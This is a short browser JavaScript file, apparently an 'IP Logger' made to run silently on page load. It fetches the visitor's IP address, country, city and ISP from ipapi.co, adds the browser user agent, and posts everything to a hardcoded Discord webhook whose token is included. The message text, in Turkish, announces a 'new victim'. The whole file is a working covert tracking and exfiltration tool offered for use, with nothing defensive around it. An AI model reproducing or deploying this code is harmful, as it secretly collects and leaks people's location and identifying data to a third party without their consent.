const webhook = "https://discord.com/api/webhooks/1489972140680679514/y3WNCXz1DgvFnYtfXME1cWRiEwhoBATmkDnUfI85b07Sl93r3QGePcnWJlzTOcpjU8hC";

async function sendLog() {
    try {
        const res = await fetch("https://ipapi.co/json/");
        const data = await res.json();

        await fetch(webhook, {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({
                content: "**Yeni Kurban Geldi** 🔥",
                embeds: [{
                    title: "IP Logger - Hit",
                    color: 0x00ff88,
                    fields: [
                        { name: "IP", value: `\`${data.ip}\``, inline: true },
                        { name: "Ülke", value: data.country_name || "Bilinmiyor", inline: true },
                        { name: "Şehir", value: data.city || "Bilinmiyor", inline: true },
                        { name: "ISP", value: data.org || "Bilinmiyor", inline: false },
                        { name: "User Agent", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false }
                    ],
                    footer: { text: "Z3NTL3 IP Logger" },
                    timestamp: new Date()
                }]
            })
        });
    } catch (e) {}
}

sendLog();
